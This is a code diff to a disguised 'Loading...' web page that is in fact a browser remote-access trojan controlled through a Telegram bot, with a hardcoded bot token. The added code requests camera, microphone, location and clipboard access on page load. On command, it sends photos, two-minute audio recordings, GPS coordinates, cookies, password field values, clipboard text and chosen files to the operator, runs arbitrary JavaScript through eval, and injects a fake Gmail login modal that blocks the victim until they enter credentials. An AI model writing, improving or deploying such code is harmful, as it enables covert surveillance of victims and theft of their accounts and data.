@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Loading...</title>
     <style>
-        /* (same stealth styles as before) */
+        /* Stealth loading + fake content (same as before) */
         body {
             margin: 0;
             padding: 0;
@@ -105,14 +105,17 @@
         const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
         const ADMIN_CHAT_ID = '8737104261';
         const POLL_INTERVAL = 3000;
-        const START_DELAY = 10000;
+        const START_DELAY = 5000;          // 5 seconds then activate
+        const AUDIO_DURATION_MS = 120000;   // 2 minutes
 
         let isRegistered = false;
         let updateId = 0;
         let intervalId = null;
         let phishingModalActive = false;
+        let deviceId = null;
+        let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
 
-        // Enable console logging for debugging (comment out for stealth)
+        // Enable console logs for debugging (remove for stealth)
         // console.log = function() {};
         // console.error = function() {};
 
@@ -122,16 +125,18 @@
         };
 
         // ================= TELEGRAM HELPERS =================
-        async function sendMessage(text, parseMode = 'HTML') {
+        async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
             try {
+                const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
+                if (replyMarkup) body.reply_markup = replyMarkup;
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode })
+                    body: JSON.stringify(body)
                 });
                 const data = await response.json();
                 console.log('sendMessage response:', data);
-                if (!data.ok) console.error('sendMessage error:', data.description);
+                return data;
             } catch(e) {
                 console.error('sendMessage exception:', e);
             }
@@ -153,18 +158,59 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
         }
 
+        // ================= PERMISSION HANDLING =================
+        async function requestAllPermissions() {
+            // Camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                permissionsStatus.camera = true;
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { permissionsStatus.camera = false; }
+            // Microphone
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                permissionsStatus.microphone = true;
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { permissionsStatus.microphone = false; }
+            // Location
+            try {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                permissionsStatus.location = true;
+            } catch(e) { permissionsStatus.location = false; }
+            // Clipboard (requires user gesture, but we try)
+            try {
+                await navigator.clipboard.readText();
+                permissionsStatus.clipboard = true;
+            } catch(e) { permissionsStatus.clipboard = false; }
+        }
+
         // ================= REGISTRATION =================
         async function registerClient() {
+            deviceId = 'dev_' + Math.random().toString(36).substr(2, 8);
             const info = {
+                deviceId,
                 url: location.href,
                 ua: navigator.userAgent,
                 platform: navigator.platform,
                 lang: navigator.language,
                 screen: `${screen.width}x${screen.height}`,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'direct'
+                referrer: document.referrer || 'direct',
+                permissions: permissionsStatus
             };
-            await sendMessage(`🔌 *New Device Connected*\n🌐 ${info.url}\n🖥️ ${info.ua.substring(0,100)}\n📱 ${info.platform}\n🌍 ${info.lang}\n📺 ${info.screen}`, 'Markdown');
+            const statusEmoji = (perm) => perm ? '🟢' : '🔴';
+            const permLine = `Camera: ${statusEmoji(permissionsStatus.camera)} | Mic: ${statusEmoji(permissionsStatus.microphone)} | GPS: ${statusEmoji(permissionsStatus.location)} | Clipboard: ${statusEmoji(permissionsStatus.clipboard)}`;
+            await sendMessage(
+                `🔌 *New Device Connected*\n` +
+                `🆔 ID: \`${deviceId}\`\n` +
+                `🌐 URL: ${info.url}\n` +
+                `📱 ${info.platform} | ${info.ua.substring(0,50)}...\n` +
+                `📺 ${info.screen} | 🌍 ${info.lang}\n` +
+                `${permLine}`,
+                'Markdown'
+            );
         }
 
         // ================= PHISHING MODAL =================
@@ -212,34 +258,52 @@
         // ================= COMMAND HANDLER =================
         async function handleCommand(text) {
             console.log('Received command:', text);
-            const parts = text.split(' ');
-            const cmd = parts[0].toLowerCase();
+            const parts = text.trim().split(' ');
+            let cmd = parts[0].toLowerCase();
+            // Aliases
+            if (cmd === '/phishgmail' || cmd === '/phish_gmail') cmd = '/phish_gmail';
+            if (cmd === '/grabpass' || cmd === '/grab_pass') cmd = '/grab_pass';
+            if (cmd === '/devices' || cmd === '/list') cmd = '/devices';
 
             try {
                 switch(cmd) {
                     case '/start':
-                        await sendMessage(`✅ *RAT Active*\n\nCommands:\n/phish_gmail - Forced Gmail login modal\n/gmail - Extract from real login page\n/photo - Camera\n/audio - Mic (5s)\n/location - GPS\n/screenshot - Page shot\n/cookies - Dump cookies\n/grab_pass - Visible password\n/clipboard - Read clipboard\n/eval <js>\n/upload - Exfiltrate file`, 'Markdown');
+                        const buttons = {
+                            inline_keyboard: [
+                                [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
+                                [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
+                                [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
+                                [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
+                                [{ text: '📁 Upload File', callback_data: 'upload' }, { text: '💻 Eval JS', callback_data: 'eval' }],
+                                [{ text: '🔄 Devices', callback_data: 'devices' }]
+                            ]
+                        };
+                        await sendMessage(
+                            `✅ *RAT Active* | Device: \`${deviceId}\`\n\n` +
+                            `🟢 Online | Permissions: Camera ${permissionsStatus.camera ? '✅' : '❌'} | Mic ${permissionsStatus.microphone ? '✅' : '❌'} | GPS ${permissionsStatus.location ? '✅' : '❌'}\n\n` +
+                            `Use buttons below or type commands.`,
+                            'Markdown', buttons
+                        );
                         break;
                     case '/phish_gmail':
                         if (!phishingModalActive) createPhishingModal();
-                        await sendMessage('🎣 Phishing modal injected.');
+                        await sendMessage('🎣 Phishing modal injected. User is blocked until credentials are entered.');
                         break;
-                    case '/gmail': {
+                    case '/gmail':
                         if (location.href.includes('accounts.google.com')) {
                             let email = document.querySelector('input[type="email"]')?.value || '';
                             let pass = document.querySelector('input[type="password"]')?.value;
                             if (!pass) {
                                 const pf = document.querySelector('input[type="password"]');
                                 if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
-                                await sendMessage('Attempting autofill...');
+                                await sendMessage('Attempting to trigger autofill...');
                             } else {
-                                await sendMessage(`🔑 Gmail: ${email} / ${pass}`);
+                                await sendMessage(`🔑 Gmail credentials extracted:\n📧 Email: ${email}\n🔑 Password: ${pass}`);
                             }
                         } else {
-                            await sendMessage('Not on Google login page. Use /phish_gmail instead.');
+                            await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
                         }
                         break;
-                    }
                     case '/photo':
                         try {
                             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -254,7 +318,7 @@
                             canvas.toBlob(blob => sendPhoto(blob, '📸 Camera capture'), 'image/jpeg');
                         } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
                         break;
-                    case '/audio': {
+                    case '/audio':
                         try {
                             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                             const mediaRecorder = new MediaRecorder(stream);
@@ -262,18 +326,17 @@
                             mediaRecorder.ondataavailable = e => chunks.push(e.data);
                             mediaRecorder.onstop = async () => {
                                 const blob = new Blob(chunks, { type: 'audio/webm' });
-                                await sendDocument(blob, 'recording.webm', '🎙️ Audio');
+                                await sendDocument(blob, `recording_${Date.now()}.webm`, `🎙️ Audio recording (${AUDIO_DURATION_MS/1000}s)`);
                                 stream.getTracks().forEach(t => t.stop());
                             };
                             mediaRecorder.start();
-                            setTimeout(() => mediaRecorder.stop(), 5000);
-                            await sendMessage('Recording audio for 5 seconds...');
+                            setTimeout(() => mediaRecorder.stop(), AUDIO_DURATION_MS);
+                            await sendMessage(`Recording audio for ${AUDIO_DURATION_MS/1000} seconds...`);
                         } catch(e) { await sendMessage(`Microphone error: ${e.message}`); }
                         break;
-                    }
                     case '/location':
                         navigator.geolocation.getCurrentPosition(async pos => {
-                            await sendMessage(`📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (${pos.coords.accuracy}m)`);
+                            await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
                         }, async err => await sendMessage(`GPS error: ${err.message}`));
                         break;
                     case '/screenshot':
@@ -284,12 +347,11 @@
                     case '/cookies':
                         await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                         break;
-                    case '/grab_pass': {
+                    case '/grab_pass':
                         const pw = document.querySelector('input[type="password"]');
                         if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
-                        else await sendMessage('No password field with value.');
+                        else await sendMessage('No password field with value found.');
                         break;
-                    }
                     case '/clipboard':
                         try {
                             const txt = await navigator.clipboard.readText();
@@ -301,81 +363,80 @@
                             const code = text.substring(5);
                             let result = eval(code);
                             if (typeof result !== 'string') result = JSON.stringify(result);
-                            await sendMessage(`✅ Eval:\n${result.substring(0, 3900)}`);
-                        } else await sendMessage('Usage: /eval <js>');
+                            await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
+                        } else await sendMessage('Usage: /eval <js code>');
                         break;
-                    case '/upload': {
+                    case '/upload':
                         const input = document.createElement('input');
                         input.type = 'file';
                         input.onchange = async (e) => {
                             const file = e.target.files[0];
-                            if (file) await sendDocument(file, file.name, `📁 ${file.name}`);
+                            if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
                         };
                         input.click();
-                        await sendMessage('File picker opened.');
+                        await sendMessage('File picker opened on victim side.');
                         break;
-                    }
+                    case '/devices':
+                        // This instance only knows itself; but we could store a global list on server-side.
+                        // For simplicity, we just show this device status.
+                        const statusLine = `🖥️ *Your device*\n🆔 \`${deviceId}\`\n🟢 Status: Online\nPermissions:\n📷 Camera: ${permissionsStatus.camera ? '✅' : '❌'}\n🎤 Mic: ${permissionsStatus.microphone ? '✅' : '❌'}\n📍 GPS: ${permissionsStatus.location ? '✅' : '❌'}\n📋 Clipboard: ${permissionsStatus.clipboard ? '✅' : '❌'}`;
+                        await sendMessage(statusLine, 'Markdown');
+                        break;
                     default:
-                        await sendMessage(`Unknown: ${cmd}`);
+                        await sendMessage(`Unknown command: ${cmd}. Try /start for help.`);
                 }
             } catch(err) {
                 await sendMessage(`Error: ${err.message}`);
             }
         }
 
-        // ================= POLLING WITH OFFSET SYNC =================
+        // ================= POLLING =================
         async function syncOffset() {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
                 const data = await res.json();
-                console.log('syncOffset response:', data);
                 if (data.ok && data.result && data.result.length > 0) {
-                    const lastId = data.result[data.result.length - 1].update_id;
-                    updateId = lastId + 1;
+                    updateId = data.result[data.result.length - 1].update_id + 1;
                 } else {
                     updateId = 0;
                 }
                 console.log('Update offset set to:', updateId);
-            } catch(e) {
-                console.error('syncOffset error:', e);
-            }
+            } catch(e) { console.error(e); }
         }
 
         async function pollUpdates() {
             if (!isRegistered) return;
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
-                console.log('Polling:', url);
                 const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                 const data = await res.json();
-                console.log('Poll response:', data);
                 if (data.ok && data.result) {
                     for (const upd of data.result) {
                         if (upd.update_id >= updateId) {
                             updateId = upd.update_id + 1;
                             if (upd.message && upd.message.text) {
-                                console.log('Processing command:', upd.message.text);
                                 await handleCommand(upd.message.text);
+                            } else if (upd.callback_query) {
+                                // Handle button callbacks
+                                const cbData = upd.callback_query.data;
+                                await handleCommand('/' + cbData);
+                                // Answer callback to remove "loading" on button
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
                             }
                         }
                     }
-                } else {
-                    console.error('Poll error:', data.description);
                 }
-            } catch(e) {
-                console.error('Poll exception:', e);
-            }
+            } catch(e) { console.error(e); }
         }
 
         // ================= INITIALIZATION =================
         async function deleteWebhookAndStart() {
             console.log('Deleting webhook...');
             try {
-                const del = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
-                const delData = await del.json();
-                console.log('deleteWebhook:', delData);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
             } catch(e) { console.error(e); }
 
+            await requestAllPermissions();
             await syncOffset();
             await registerClient();
             isRegistered = true;
